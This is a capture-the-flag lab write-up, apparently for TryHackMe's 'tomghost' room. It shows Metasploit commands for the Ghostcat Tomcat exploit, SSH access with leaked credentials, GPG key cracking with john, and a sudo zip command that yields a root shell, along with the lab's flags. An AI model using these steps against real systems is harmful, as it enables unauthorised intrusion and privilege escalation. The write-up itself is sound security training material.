## 💥 Exploitation

### Step 1: msfconsole
- First, I booted up msfconsole with `msfconsole`
- I looked up words similar to tomghost, ghostcat, etc and found an exploit under `search ghostcat`
- I used `use auxiliary/admin/http/tomcat_ghostcat` to equip this exploit
    - Set the option for `RHOSTS` to `TARGET_IP` with `set RHOSTS TARGET_IP`
- `exploit`
    - This gives me a username and what seems to be a password
```bash 
    <display-name>Welcome to Tomcat</display-name>
    <description>
        Welcome to GhostCat
	    skyfuck:8730281lkjlkjdqlksalks
    </description>
```

### Step 2: SSH
- I simply `ssh skyfuck@TARGET_IP` and use the password from above and it worked
- `ls` and see nothing of note
    - `ls ..` and see another user named `merlin`
    - `ls ../merlin` and find `user.txt`
    - Upon `cat user.txt`, we get first flag: `THM{GhostCat_1s_so_cr4sy}`

### Step 3: Escalate Privilege
- Next, I need to escalate privilege
- When I `ls` inside of skyfuck's home directory, I see `credential.pgp` and `tryhackme.asc`
- These are both `gpg` encrypted, which can be cracked by `john` after being turned into a typical `john` hash via `gpg2john`
    - `gpg2john tryhackme.asc >> hash`
    - And then crack with `john hash /usr/share/wordlists/rockyou.txt`
    - This gives `alexandru` which is the passphrase for decrypting `credential.pgp`
- After unlocking the passphrase, I go back into the target via `ssh skyfuck@TARGET_IP`
    - I add the public key `tryhackme.asc` to the keyring via `gpg --import tryhackme.asc`
    - I attempt to decrypt `credential.pgp` via `gpg --decrypt credential.pgp` and put in `alexandru` when prompted for the passphrase
    - Finally, we get merlin's password
- We know merlin has sudoed before successfully, so simply `su merlin` and paste the password
    - Next, `sudo -l` to see what merlin can run
    - merlin can use `/usr/bin/zip`
    - Personally, I don't know what this implies, so I go to https://gtfobins.org/ to actually find if there's anything I can do with this information
    - GTFO bins gave me this payload `zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'`
- Running this, you get a shell, but it's useless
    - Essentially same privileges as non-sudo merlin, so you want to actually use `sudo zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'`
    - Finally, just `ls /root` and now you can access `root.txt` via `cat /root/root.txt`
    - Escalate privileges and obtain root.txt → `THM{Z1P_1S_FAKE}`

## 🔑 Key Takeaways
- I learned about GPG and how to decrypt and import keys
    - I still don't fully understand GPG and need to be able to identify and distinguish it in one look
    - I couldn't do this earlier with `credential.pgp` (already in the filename) and `tryhackme.asc` (shows you when you `cat`)
    - I don't understand passphrases for basically everything yet as well
        - I know how encryption and hashing works, I just don't know where passphrases fall in the puzzle
- Another thing I learned, when using john, it's probably better to save everything locally and not run john on the target machine
    - First of all john is intrusive
    - Second maybe john isn't even installed on the target (more likely)
- Tools/commands to remember
    - `gpg2john`
    - `gpg --import`
    - `gpg --decrypt`
